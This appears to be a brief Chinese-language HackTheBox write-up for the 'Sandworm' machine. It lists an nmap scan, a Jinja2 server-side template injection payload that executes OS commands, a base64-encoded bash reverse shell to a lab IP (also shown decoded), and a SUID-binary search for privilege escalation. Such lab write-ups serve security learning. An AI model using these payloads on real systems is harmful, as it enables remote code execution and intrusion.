---
title: HTB-Sandworm
contest: HackTheBox Sandworm
year: 2023
difficulty: medium
vuln_type: ssti
tags: [htb, pentest, nmap, ssti, jinja2, suid, privesc, base64]
attack_chain:
  - nmap -sC -sV 10.10.11.218 端口扫描
  - SSTI: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i"').read() }}
  - Payload: echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yNy80NDQgMD4mMQo=" | base64 -d | bash
  - 反弹shell后find / -perm -4000 -type f 2>/dev/null查SUID
key_payload: {{ self.__init__.__globals__.__builtins__.__import__('os').popen(...).read() }}
one_liner: HTB Sandworm：Jinja2 SSTI反弹shell+SUID提权
lesson: Jinja2 SSTI 经典 payload 反弹 shell
quality: low
---

# HTB-Sandworm

## 题目信息
- 平台：HackTheBox
- 题目：Sandworm
- 类别：Pentest 实战

## 关键攻击链
### 1. 端口扫描
```bash
nmap -sC -sV 10.10.11.218
```

### 2. SSTI 注入
```jinja
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yNy80NDQgMD4mMQo=" | base64 -d | bash').read() }}
```

### 3. 反弹 shell
```bash
bash -i >& /dev/tcp/10.10.16.27/444 0>&1
# base64: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yNy80NDQgMD4mMQo=
```

### 4. 提权
```bash
find / -perm -4000 -type f 2>/dev/null
```

## 评分
- quality: low（仅 64 行，HTB 实战文摘，附图为主）
